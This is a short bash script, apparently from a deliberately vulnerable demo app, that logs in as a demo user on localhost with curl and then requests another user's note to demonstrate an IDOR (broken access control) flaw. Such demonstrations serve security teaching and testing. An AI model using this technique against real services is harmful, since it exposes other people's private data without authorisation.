#!/usr/bin/env bash
set -euo pipefail

BASE_URL="${BASE_URL:-http://localhost:4000}"

echo "Login userA"
LOGIN=$(curl -s -X POST "$BASE_URL/auth/login" -H "Content-Type: application/json" \
  -d '{"email":"usera@demo.com","password":"passwordA"}')
echo "$LOGIN"

ACCESS=$(echo "$LOGIN" | python -c "import sys, json; print(json.load(sys.stdin)['accessToken'])")

echo "List notes (may be IDOR vulnerable in insecure mode)"
curl -s -H "Authorization: Bearer $ACCESS" "$BASE_URL/notes"

echo
echo "Fetch noteB1 (IDOR demo)"
curl -s -H "Authorization: Bearer $ACCESS" "$BASE_URL/notes/noteB1"
